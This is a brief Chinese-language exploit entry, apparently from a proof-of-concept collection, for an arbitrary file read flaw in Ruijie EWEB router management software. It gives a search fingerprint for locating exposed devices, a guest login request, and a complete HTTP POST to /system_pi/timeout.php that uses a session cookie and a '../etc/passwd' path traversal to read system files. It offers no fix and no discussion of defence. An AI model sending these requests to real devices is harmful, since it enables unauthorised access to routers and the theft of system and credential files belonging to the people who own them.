# 锐捷EWEB路由器timeout.php存在任意文件读取漏洞

- **系统**：锐捷　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="锐捷网络-EWEB网管系统"`
- **请求**：`POST /ddi/server/login.php HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
username=guest&password=guest?
利用可用cookie访问接口
POST /system_pi/timeout.php?a=getFile HTTP/1.1
Host:
Content-Length: 22
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=sgkh17phn774d4koqidko54pa4; user=admin
fileName=../etc/passwd
```
- **预期**：200　|　—